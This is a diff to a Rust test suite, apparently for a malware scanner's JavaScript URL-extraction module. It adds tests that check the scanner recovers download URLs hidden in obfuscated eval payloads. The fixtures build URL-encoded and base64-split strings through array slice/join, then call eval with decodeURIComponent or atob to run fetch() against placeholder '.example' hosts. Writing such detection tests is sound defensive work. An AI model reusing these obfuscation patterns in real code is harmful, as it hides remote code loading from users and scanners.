@@ -9500,6 +9500,25 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_decodeuricomponent_assigned_array_slice_join_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var a = ["noise", "https%3A", "%2F%2Fdecode-assigned-array-slice-join-js.example", "%2Fp", "noise"]; var e = a.slice(1, 4).join(""); eval(decodeURIComponent(e))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-assigned-array-slice-join-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent assigned array slice/join URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_decodeuricomponent_concat_arg_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let js = br#"var p = "https%3A%2F%2Fdecode-concat-arg-js."; var q = "example%2Fp"; eval(decodeURIComponent(p + q))"#
@@ -10235,6 +10254,32 @@ mod js_url_extraction_tests {
         assert!(
             has,
             "JS atob array join payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_array_slice_join_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-array-slice-join-js.example/p')",
+        );
+        let split = encoded.len() / 2;
+        let (left, right) = encoded.split_at(split);
+        let js =
+            format!(r#"var a = ["noise", "{left}", "{right}"]; eval(atob(a.slice(1).join("")))"#)
+                .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-array-slice-join-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob array slice/join payload URL missed: {:?}",
             env.traits
         );
     }
